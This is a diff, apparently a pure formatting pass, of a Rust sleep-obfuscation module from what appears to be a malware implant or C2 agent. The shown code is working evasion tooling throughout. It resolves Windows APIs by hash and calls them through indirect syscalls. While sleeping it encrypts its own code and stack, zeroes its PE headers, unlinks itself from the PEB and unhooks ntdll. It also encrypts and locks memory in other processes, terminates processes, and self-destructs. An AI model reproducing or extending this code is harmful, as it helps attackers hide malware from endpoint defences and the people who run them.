@@ -67,10 +67,9 @@ const fn duration_to_100ns(dur: std::time::Duration) -> i64 {
 #[inline(always)]
 unsafe fn sleep_no_iat(duration: std::time::Duration) {
     if let Some(ntdll) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
-        if let Some(addr) = pe_resolve::get_proc_address_by_hash(
-            ntdll,
-            pe_resolve::hash_str(b"NtDelayExecution\0"),
-        ) {
+        if let Some(addr) =
+            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtDelayExecution\0"))
+        {
             let nt_delay: extern "system" fn(u8, *mut i64) -> i32 = std::mem::transmute(addr);
             let mut delay_100ns = duration_to_100ns(duration);
             nt_delay(0, &mut delay_100ns);
@@ -169,7 +168,10 @@ pub fn set_sleep_variant(variant: SleepVariant) {
     let lock = runtime_variant();
     if let Ok(mut guard) = lock.lock() {
         *guard = Some(variant);
-        log::info!("[sleep_obfuscation] runtime sleep variant set to {:?}", variant);
+        log::info!(
+            "[sleep_obfuscation] runtime sleep variant set to {:?}",
+            variant
+        );
     }
 }
 
@@ -324,7 +326,9 @@ fn is_encodable_protect(prot: u32, include_heap: bool) -> bool {
         return false;
     }
     // Code sections: always encrypt.
-    if masked & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY) != 0 {
+    if masked & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)
+        != 0
+    {
         return true;
     }
     // Data sections: only if encrypt_heap is enabled.
@@ -412,11 +416,7 @@ unsafe fn enumerate_regions(include_heap: bool) -> Vec<(*mut u8, usize, u32)> {
 // ── NtProtectVirtualMemory (via indirect syscall) ────────────────────────────
 
 /// Change page protection via indirect syscall through clean ntdll.
-unsafe fn protect_memory(
-    base: *mut u8,
-    size: usize,
-    new_prot: u32,
-) -> Option<u32> {
+unsafe fn protect_memory(base: *mut u8, size: usize, new_prot: u32) -> Option<u32> {
     let mut base_addr = base as *mut std::ffi::c_void;
     let mut region_size = size;
     let mut old_prot: u32 = 0;
@@ -462,15 +462,15 @@ unsafe fn protect_memory(
         //   OldProtect:    *mut ULONG,
         // ) -> NTSTATUS
         type FnNtProtectVirtualMemory = unsafe extern "system" fn(
-            usize,                         // ProcessHandle
-            *mut *mut std::ffi::c_void,    // BaseAddress
-            *mut usize,                    // RegionSize
-            u32,                           // NewProtect
-            *mut u32,                      // OldProtect
+            usize,                      // ProcessHandle
+            *mut *mut std::ffi::c_void, // BaseAddress
+            *mut usize,                 // RegionSize
+            u32,                        // NewProtect
+            *mut u32,                   // OldProtect
         ) -> i32;
         let ntpvm: FnNtProtectVirtualMemory = std::mem::transmute(addr);
         let status = ntpvm(
-            (-1isize) as usize,  // Current process handle
+            (-1isize) as usize, // Current process handle
             &mut base_addr,
             &mut region_size,
             new_prot,
@@ -526,8 +526,7 @@ fn encrypt_region_chunks(
         // For AEAD we need to encrypt in-place but the API returns ct || tag.
         // Copy the chunk to a temp buffer, encrypt, write ciphertext back,
         // save the tag.
-        let chunk_slice =
-            unsafe { std::slice::from_raw_parts(ptr.add(offset), chunk_len) };
+        let chunk_slice = unsafe { std::slice::from_raw_parts(ptr.add(offset), chunk_len) };
         let ct_tag = cipher
             .encrypt(xnonce, chunk_slice as &[u8])
             .map_err(|_| anyhow!("XChaCha20-Poly1305 encryption failed"))?;
@@ -535,11 +534,7 @@ fn encrypt_region_chunks(
         // ct_tag = [ciphertext || tag(16 bytes)]
         let ct_len = ct_tag.len() - TAG_LEN;
         unsafe {
-            std::ptr::copy_nonoverlapping(
-                ct_tag.as_ptr(),
-                ptr.add(offset),
-                ct_len,
-            );
+            std::ptr::copy_nonoverlapping(ct_tag.as_ptr(), ptr.add(offset), ct_len);
         }
 
         let mut tag = [0u8; TAG_LEN];
@@ -573,9 +568,9 @@ fn decrypt_region_chunks(
     while offset < size {
         let end = (offset + CHUNK_SIZE).min(size);
         let chunk_len = end - offset;
-        let tag = tags.get(chunk_idx as usize).ok_or_else(|| {
-            anyhow!("missing tag for chunk {} of region {:p}", chunk_idx, base)
-        })?;
+        let tag = tags
+            .get(chunk_idx as usize)
+            .ok_or_else(|| anyhow!("missing tag for chunk {} of region {:p}", chunk_idx, base))?;
 
         // P2-06: Counter-based nonce derivation — overwrite last 4 bytes with
         // chunk counter (big-endian), matching the encryption side.
@@ -703,9 +698,7 @@ unsafe fn decrypt_stack(
     combined.extend_from_slice(tag);
 
     let pt = cipher.decrypt(xnonce, combined.as_slice()).map_err(|_| {
-        anyhow!(
-            "[sleep_obfuscation] Stack AEAD tag mismatch: possible memory tampering"
-        )
+        anyhow!("[sleep_obfuscation] Stack AEAD tag mismatch: possible memory tampering")
     })?;
 
     std::ptr::copy_nonoverlapping(pt.as_ptr(), base, pt.len());
@@ -730,7 +723,10 @@ unsafe fn zero_pe_headers() {
         let peb = *((teb + 0x60) as *const usize) as *const u8;
         *(peb.add(0x10) as *const usize) as *mut u8
     };
-    #[cfg(not(any(target_arch = "x86_64", all(target_arch = "aarch64", target_os = "windows"))))]
+    #[cfg(not(any(
+        target_arch = "x86_64",
+        all(target_arch = "aarch64", target_os = "windows")
+    )))]
     let base: *mut u8 = std::ptr::null_mut();
 
     if base.is_null() {
@@ -781,7 +777,10 @@ unsafe fn restore_pe_headers(header_backup: &[u8], orig_prot: Option<u32>) {
         let peb = *((teb + 0x60) as *const usize) as *const u8;
         *(peb.add(0x10) as *const usize) as *mut u8
     };
-    #[cfg(not(any(target_arch = "x86_64", all(target_arch = "aarch64", target_os = "windows"))))]
+    #[cfg(not(any(
+        target_arch = "x86_64",
+        all(target_arch = "aarch64", target_os = "windows")
+    )))]
     let base: *mut u8 = std::ptr::null_mut();
 
     if base.is_null() || header_backup.is_empty() {
@@ -814,7 +813,10 @@ unsafe fn backup_pe_headers() -> (Vec<u8>, Option<u32>) {
         let peb = *((teb + 0x60) as *const usize) as *const u8;
         *(peb.add(0x10) as *const usize) as *const u8
     };
-    #[cfg(not(any(target_arch = "x86_64", all(target_arch = "aarch64", target_os = "windows"))))]
+    #[cfg(not(any(
+        target_arch = "x86_64",
+        all(target_arch = "aarch64", target_os = "windows")
+    )))]
     let base: *const u8 = std::ptr::null();
 
     if base.is_null() {
@@ -862,7 +864,10 @@ unsafe fn unlink_from_peb() -> Option<(*mut u8, *mut u8, *mut u8, *mut u8)> {
         std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
         (teb + 0x60) as *const u8
     };
-    #[cfg(not(any(target_arch = "x86_64", all(target_arch = "aarch64", target_os = "windows"))))]
+    #[cfg(not(any(
+        target_arch = "x86_64",
+        all(target_arch = "aarch64", target_os = "windows")
+    )))]
     let peb: *const u8 = std::ptr::null();
 
     if peb.is_null() {
@@ -889,14 +894,13 @@ unsafe fn unlink_from_peb() -> Option<(*mut u8, *mut u8, *mut u8, *mut u8)> {
     // unlink it from all three lists.
 
     #[cfg(target_arch = "x86_64")]
-    let image_base: usize = {
-        *(peb.add(0x10) as *const usize)
-    };
+    let image_base: usize = { *(peb.add(0x10) as *const usize) };
     #[cfg(all(target_arch = "aarch64", target_os = "windows"))]
-    let image_base: usize = {
-        *(peb.add(0x10) as *const usize)
-    };
-    #[cfg(not(any(target_arch = "x86_64", all(target_arch = "aarch64", target_os = "windows"))))]
+    let image_base: usize = { *(peb.add(0x10) as *const usize) };
+    #[cfg(not(any(
+        target_arch = "x86_64",
+        all(target_arch = "aarch64", target_os = "windows")
+    )))]
     let image_base: usize = 0;
 
     if image_base == 0 {
@@ -1028,7 +1032,8 @@ fn find_ret_gadget(module_base: usize) -> Option<usize> {
             // Use NtQueryVirtualMemory to check that the region is readable.
             let mut mbi: Mbi = std::mem::zeroed();
             let mut ret_len: usize = 0;
-            let ntdll_base = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
+            let ntdll_base = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
+            {
                 Some(b) => b,
                 None => return None,
             };
@@ -1040,7 +1045,12 @@ fn find_ret_gadget(module_base: usize) -> Option<usize> {
                 None => return None,
             };
             let nt_query_vm: extern "system" fn(
-                usize, *mut std::ffi::c_void, u32, *mut std::ffi::c_void, usize, *mut usize,
+                usize,
+                *mut std::ffi::c_void,
+                u32,
+                *mut std::ffi::c_void,
+                usize,
+                *mut usize,
             ) -> i32 = std::mem::transmute(qvm_addr);
             let status = nt_query_vm(
                 (-1isize) as usize,
@@ -1093,8 +1103,7 @@ unsafe fn self_destruct() -> ! {
             base,
             pe_resolve::hash_str(b"NtTerminateProcess\0"),
         ) {
-            let nt_terminate: extern "system" fn(usize, u32) -> i32 =
-                std::mem::transmute(addr);
+            let nt_terminate: extern "system" fn(usize, u32) -> i32 = std::mem::transmute(addr);
             nt_terminate((-1isize) as usize, 1);
         }
     }
@@ -1184,7 +1193,9 @@ fn xchacha20_decrypt(
     let mut buf = data.to_vec();
     cipher
         .decrypt_in_place_detached(iv, aad, &mut buf, tag.into())
-        .map_err(|_| anyhow!("Cronus XChaCha20-Poly1305 tag verification failed — possible tampering"))?;
+        .map_err(|_| {
+            anyhow!("Cronus XChaCha20-Poly1305 tag verification failed — possible tampering")
+        })?;
     data.copy_from_slice(&buf);
     Ok(())
 }
@@ -1210,7 +1221,9 @@ unsafe fn cronus_free_stub(addr: usize, size: usize) {
             std::ptr::write_bytes(addr as *mut u8, 0, size);
 
             // Free via pe_resolve → VirtualFree to avoid IAT entry.
-            if let Some(kernel32) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
+            if let Some(kernel32) =
+                pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+            {
                 if let Some(vf_addr) = pe_resolve::get_proc_address_by_hash(
                     kernel32,
                     pe_resolve::hash_str(b"VirtualFree\0"),
@@ -1228,7 +1241,8 @@ unsafe fn cronus_free_stub(addr: usize, size: usize) {
     }
     #[cfg(not(feature = "direct-syscalls"))]
     {
-        if let Some(kernel32) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
+        if let Some(kernel32) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+        {
             if let Some(vf_addr) = pe_resolve::get_proc_address_by_hash(
                 kernel32,
                 pe_resolve::hash_str(b"VirtualFree\0"),
@@ -1262,11 +1276,8 @@ fn cronus_probe() -> bool {
         let ntdll = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) };
         if let Some(base) = ntdll {
             unsafe {
-                pe_resolve::get_proc_address_by_hash(
-                    base,
-                    pe_resolve::hash_str(b"NtSetTimer\0"),
-                )
-                .is_some()
+                pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"NtSetTimer\0"))
+                    .is_some()
                     && pe_resolve::get_proc_address_by_hash(
                         base,
                         pe_resolve::hash_str(b"NtCreateTimer\0"),
@@ -1353,38 +1364,31 @@ unsafe fn cronus_sleep(duration: std::time::Duration) -> Result<()> {
             .ok_or_else(|| anyhow!("cannot resolve ntdll"))?;
 
         // NtCreateTimer
-        let create_addr = pe_resolve::get_proc_address_by_hash(
-            ntdll,
-            pe_resolve::hash_str(b"NtCreateTimer\0"),
-        ).ok_or_else(|| anyhow!("cannot resolve NtCreateTimer"))?;
+        let create_addr =
+            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtCreateTimer\0"))
+                .ok_or_else(|| anyhow!("cannot resolve NtCreateTimer"))?;
 
         // NtSetTimer
-        let set_addr = pe_resolve::get_proc_address_by_hash(
-            ntdll,
-            pe_resolve::hash_str(b"NtSetTimer\0"),
-        ).ok_or_else(|| anyhow!("cannot resolve NtSetTimer"))?;
+        let set_addr =
+            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtSetTimer\0"))
+                .ok_or_else(|| anyhow!("cannot resolve NtSetTimer"))?;
 
         // NtWaitForSingleObject
         let wait_addr = pe_resolve::get_proc_address_by_hash(
             ntdll,
             pe_resolve::hash_str(b"NtWaitForSingleObject\0"),
-        ).ok_or_else(|| anyhow!("cannot resolve NtWaitForSingleObject"))?;
+        )
+        .ok_or_else(|| anyhow!("cannot resolve NtWaitForSingleObject"))?;
 
         // NtClose
-        let close_addr = pe_resolve::get_proc_address_by_hash(
-            ntdll,
-            pe_resolve::hash_str(b"NtClose\0"),
-        ).ok_or_else(|| anyhow!("cannot resolve NtClose"))?;
+        let close_addr =
+            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtClose\0"))
+                .ok_or_else(|| anyhow!("cannot resolve NtClose"))?;
 
-        type FnNtCreateTimer = unsafe extern "system" fn(
-            *mut usize, u32, usize, u32,
-        ) -> i32;
-        type FnNtSetTimer = unsafe extern "system" fn(
-            usize, *const i64, usize, usize, u8, i32, *mut u8,
-        ) -> i32;
-        type FnNtWaitForSingleObject = unsafe extern "system" fn(
-            usize, u8, *const i64,
-        ) -> i32;
+        type FnNtCreateTimer = unsafe extern "system" fn(*mut usize, u32, usize, u32) -> i32;
+        type FnNtSetTimer =
+            unsafe extern "system" fn(usize, *const i64, usize, usize, u8, i32, *mut u8) -> i32;
+        type FnNtWaitForSingleObject = unsafe extern "system" fn(usize, u8, *const i64) -> i32;
         type FnNtClose = unsafe extern "system" fn(usize) -> i32;
 
         let nt_create: FnNtCreateTimer = std::mem::transmute(create_addr);
@@ -1401,7 +1405,10 @@ unsafe fn cronus_sleep(duration: std::time::Duration) -> Result<()> {
             0,          // NotificationTimer
         );
         if status < 0 || timer_handle == 0 {
-            return Err(anyhow!("NtCreateTimer failed: NTSTATUS={:#010x}", status as u32));
+            return Err(anyhow!(
+                "NtCreateTimer failed: NTSTATUS={:#010x}",
+                status as u32
+            ));
         }
 
         // 2. Set the timer with a negative relative timeout.
@@ -1417,7 +1424,10 @@ unsafe fn cronus_sleep(duration: std::time::Duration) -> Result<()> {
         );
         if status < 0 {
             nt_close(timer_handle);
-            return Err(anyhow!("NtSetTimer failed: NTSTATUS={:#010x}", status as u32));
+            return Err(anyhow!(
+                "NtSetTimer failed: NTSTATUS={:#010x}",
+                status as u32
+            ));
         }
 
         // 3. Wait for the timer to be signaled.
@@ -1451,40 +1461,34 @@ unsafe fn cronus_build_xchacha20_stub() -> Result<(usize, usize)> {
     let stub_size = 4096; // one page
 
     // Allocate via pe_resolve → VirtualAlloc to avoid IAT entry.
-    let stub_addr =
-        if let Some(kernel32) =
-            pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+    let stub_addr = if let Some(kernel32) =
+        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+    {
+        if let Some(va_addr) =
+            pe_resolve::get_proc_address_by_hash(kernel32, pe_resolve::hash_str(b"VirtualAlloc\0"))
         {
-            if let Some(va_addr) = pe_resolve::get_proc_address_by_hash(
-                kernel32,
-                pe_resolve::hash_str(b"VirtualAlloc\0"),
-            ) {
-                let va: unsafe extern "system" fn(
-                    *mut std::ffi::c_void,
-                    usize,
-                    u32,
-                    u32,
-                ) -> *mut std::ffi::c_void = std::mem::transmute(va_addr);
-                va(
-                    std::ptr::null_mut(),
-                    stub_size,
-                    0x3000u32, // MEM_COMMIT | MEM_RESERVE
-                    0x40u32,   // PAGE_EXECUTE_READWRITE
-                )
-            } else {
-                return Err(anyhow!(
-                    "VirtualAlloc not resolved for Cronus XChaCha20 stub"
-                ));
-            }
+            let va: unsafe extern "system" fn(
+                *mut std::ffi::c_void,
+                usize,
+                u32,
+                u32,
+            ) -> *mut std::ffi::c_void = std::mem::transmute(va_addr);
+            va(
+                std::ptr::null_mut(),
+                stub_size,
+                0x3000u32, // MEM_COMMIT | MEM_RESERVE
+                0x40u32,   // PAGE_EXECUTE_READWRITE
+            )
         } else {
             return Err(anyhow!(
-                "kernel32 not resolved for Cronus XChaCha20 stub"
+                "VirtualAlloc not resolved for Cronus XChaCha20 stub"
             ));
-        };
+        }
+    } else {
+        return Err(anyhow!("kernel32 not resolved for Cronus XChaCha20 stub"));
+    };
     if stub_addr.is_null() {
-        return Err(anyhow!(
-            "VirtualAlloc failed for Cronus XChaCha20 stub"
-        ));
+        return Err(anyhow!("VirtualAlloc failed for Cronus XChaCha20 stub"));
     }
 
     let base = stub_addr as *mut u8;
@@ -1503,30 +1507,22 @@ unsafe fn cronus_build_xchacha20_stub() -> Result<(usize, usize)> {
     //   ret
     let code: [u8; 12] = [
         // sub rsp, 0x28
-        0x48, 0x83, 0xEC, 0x28,
-        // call r8
-        0x41, 0xFF, 0xD0,
-        // add rsp, 0x28
-        0x48, 0x83, 0xC4, 0x28,
-        // ret
+        0x48, 0x83, 0xEC, 0x28, // call r8
+        0x41, 0xFF, 0xD0, // add rsp, 0x28
+        0x48, 0x83, 0xC4, 0x28, // ret
         0xC3,
     ];
 
     std::ptr::copy_nonoverlapping(code.as_ptr(), base, code.len());
 
     // Flush instruction cache via pe_resolve (harmless on x86-64, avoids IAT).
-    if let Some(kernel32) =
-        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
-    {
+    if let Some(kernel32) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
         if let Some(fic_addr) = pe_resolve::get_proc_address_by_hash(
             kernel32,
             pe_resolve::hash_str(b"FlushInstructionCache\0"),
         ) {
-            let fic: unsafe extern "system" fn(
-                usize,
-                *const std::ffi::c_void,
-                usize,
-            ) -> i32 = std::mem::transmute(fic_addr);
+            let fic: unsafe extern "system" fn(usize, *const std::ffi::c_void, usize) -> i32 =
+                std::mem::transmute(fic_addr);
             fic((-1isize) as usize, stub_addr, code.len());
         }
     }
@@ -1854,9 +1850,7 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     #[cfg(windows)]
     {
         if let Err(e) = crate::ntdll_unhook::maybe_unhook() {
-            log::warn!(
-                "[sleep_obfuscation] post-wake ntdll re-unhook failed: {e}"
-            );
+            log::warn!("[sleep_obfuscation] post-wake ntdll re-unhook failed: {e}");
         }
     }
 
@@ -1955,10 +1949,8 @@ fn remote_processes() -> &'static std::sync::Mutex<Vec<RemoteProcess>> {
 /// read/write/operation access.
 unsafe fn open_remote_process(pid: u32) -> Option<usize> {
     let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
-    let func_addr = pe_resolve::get_proc_address_by_hash(
-        ntdll,
-        pe_resolve::hash_str(b"NtOpenProcess\0"),
-    )?;
+    let func_addr =
+        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtOpenProcess\0"))?;
 
     // PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE
     const ACCESS_MASK: u64 = (0x0008 | 0x0010 | 0x0020) as u64;
@@ -1970,12 +1962,8 @@ unsafe fn open_remote_process(pid: u32) -> Option<usize> {
     client_id[0] = pid as u64;
 
     let mut handle: usize = 0;
-    let nt_open: extern "system" fn(
-        *mut usize,
-        u64,
-        *mut u64,
-        *mut u64,
-    ) -> i32 = std::mem::transmute(func_addr);
+    let nt_open: extern "system" fn(*mut usize, u64, *mut u64, *mut u64) -> i32 =
+        std::mem::transmute(func_addr);
 
     let status = nt_open(
         &mut handle,
@@ -1992,11 +1980,7 @@ unsafe fn open_remote_process(pid: u32) -> Option<usize> {
 }
 
 /// Read memory from a remote process via NtReadVirtualMemory (indirect syscall).
-unsafe fn remote_read(
-    process_handle: usize,
-    base: usize,
-    buf: &mut [u8],
-) -> bool {
+unsafe fn remote_read(process_handle: usize, base: usize, buf: &mut [u8]) -> bool {
     let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
         Some(b) => b,
         None => return false,
@@ -2010,10 +1994,10 @@ unsafe fn remote_read(
     };
 
     let nt_read: extern "system" fn(
-        usize,   // ProcessHandle
-        *mut u8, // BaseAddress (const in target)
-        *mut u8, // Buffer
-        usize,   // NumberOfBytesToRead
+        usize,      // ProcessHandle
+        *mut u8,    // BaseAddress (const in target)
+        *mut u8,    // Buffer
+        usize,      // NumberOfBytesToRead
         *mut usize, // NumberOfBytesRead
     ) -> i32 = std::mem::transmute(func_addr);
 
@@ -2030,11 +2014,7 @@ unsafe fn remote_read(
 }
 
 /// Write memory to a remote process via NtWriteVirtualMemory (indirect syscall).
-unsafe fn remote_write(
-    process_handle: usize,
-    base: usize,
-    buf: &[u8],
-) -> bool {
+unsafe fn remote_write(process_handle: usize, base: usize, buf: &[u8]) -> bool {
     let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
         Some(b) => b,
         None => return false,
@@ -2048,10 +2028,10 @@ unsafe fn remote_write(
     };
 
     let nt_write: extern "system" fn(
-        usize,   // ProcessHandle
-        *const u8, // BaseAddress
-        *const u8, // Buffer
-        usize,   // NumberOfBytesToWrite
+        usize,      // ProcessHandle
+        *const u8,  // BaseAddress
+        *const u8,  // Buffer
+        usize,      // NumberOfBytesToWrite
         *mut usize, // NumberOfBytesWritten
     ) -> i32 = std::mem::transmute(func_addr);
 
@@ -2103,11 +2083,11 @@ unsafe fn remote_protect(
         )?;
 
         let nt_protect: extern "system" fn(
-            usize,                 // ProcessHandle
+            usize,                      // ProcessHandle
             *mut *mut std::ffi::c_void, // BaseAddress
-            *mut usize,            // RegionSize
-            u32,                   // NewProtect
-            *mut u32,              // OldProtect
+            *mut usize,                 // RegionSize
+            u32,                        // NewProtect
+            *mut u32,                   // OldProtect
         ) -> i32 = std::mem::transmute(func_addr);
 
         let status = nt_protect(
@@ -2150,7 +2130,11 @@ pub fn register_remote_process(
     key: [u8; 32],
 ) -> Result<()> {
     if size == 0 || base_addr == 0 {
-        return Err(anyhow!("invalid remote region: base={:#x}, size={}", base_addr, size));
+        return Err(anyhow!(
+            "invalid remote region: base={:#x}, size={}",
+            base_addr,
+            size
+        ));
     }
 
     let process_handle = unsafe { open_remote_process(pid) }
@@ -2187,12 +2171,10 @@ pub fn register_remote_process(
         unsafe {
             let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
             if let Some(base) = ntdll {
-                if let Some(addr) = pe_resolve::get_proc_address_by_hash(
-                    base,
-                    pe_resolve::hash_str(b"NtClose\0"),
-                ) {
-                    let nt_close: extern "system" fn(usize) -> i32 =
-                        std::mem::transmute(addr);
+                if let Some(addr) =
+                    pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"NtClose\0"))
+                {
+                    let nt_close: extern "system" fn(usize) -> i32 = std::mem::transmute(addr);
                     nt_close(existing.process_handle);
                     // Close Cronus timer handle if allocated.
                     if existing.timer_handle != 0 {
@@ -2212,7 +2194,9 @@ pub fn register_remote_process(
 
     log::info!(
         "[sleep_obfuscation] registered remote process pid={} base={:#x} size={}",
-        pid, base_addr, size
+        pid,
+        base_addr,
+        size
     );
 
     Ok(())
@@ -2234,12 +2218,10 @@ pub fn unregister_remote_process(pid: u32) {
         unsafe {
             let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
             if let Some(base) = ntdll {
-                if let Some(addr) = pe_resolve::get_proc_address_by_hash(
-                    base,
-                    pe_resolve::hash_str(b"NtClose\0"),
-                ) {
-                    let nt_close: extern "system" fn(usize) -> i32 =
-                        std::mem::transmute(addr);
+                if let Some(addr) =
+                    pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"NtClose\0"))
+                {
+                    let nt_close: extern "system" fn(usize) -> i32 = std::mem::transmute(addr);
                     nt_close(removed.process_handle);
                     // Close Cronus timer handle if allocated.
                     if removed.timer_handle != 0 {
@@ -2331,12 +2313,7 @@ unsafe fn encrypt_remote_regions() {
         if !encrypt_ok {
             // Restore original protection.
             if let Some(old) = old_prot {
-                let _ = remote_protect(
-                    remote.process_handle,
-                    remote.base_addr,
-                    size,
-                    old,
-                );
+                let _ = remote_protect(remote.process_handle, remote.base_addr, size, old);
             }
             continue;
         }
@@ -2348,24 +2325,14 @@ unsafe fn encrypt_remote_regions() {
                 remote.pid
             );
             if let Some(old) = old_prot {
-                let _ = remote_protect(
-                    remote.process_handle,
-                    remote.base_addr,
-                    size,
-                    old,
-                );
+                let _ = remote_protect(remote.process_handle, remote.base_addr, size, old);
             }
             continue;
         }
 
         // Set remote region to PAGE_NOACCESS for maximum stealth.
         let final_prot = if let Some(old) = old_prot {
-            let _ = remote_protect(
-                remote.process_handle,
-                remote.base_addr,
-                size,
-                PAGE_NOACCESS,
-            );
+            let _ = remote_protect(remote.process_handle, remote.base_addr, size, PAGE_NOACCESS);
             old
         } else {
             remote.orig_protect
@@ -2478,8 +2445,7 @@ unsafe fn decrypt_remote_regions() {
                     base,
                     pe_resolve::hash_str(b"NtTerminateProcess\0"),
                 ) {
-                    let nt_term: extern "system" fn(usize, u32) -> i32 =
-                        std::mem::transmute(addr);
+                    let nt_term: extern "system" fn(usize, u32) -> i32 = std::mem::transmute(addr);
                     nt_term(remote.process_handle, 1);
                 }
             }
@@ -2592,7 +2558,10 @@ mod tests {
         tags[0][0] ^= 0xFF;
 
         let result = decrypt_region_chunks(&key, buf.as_mut_ptr(), size, &nonce, &tags);
-        assert!(result.is_err(), "tampered tag must cause decryption failure");
+        assert!(
+            result.is_err(),
+            "tampered tag must cause decryption failure"
+        );
     }
 
     #[test]
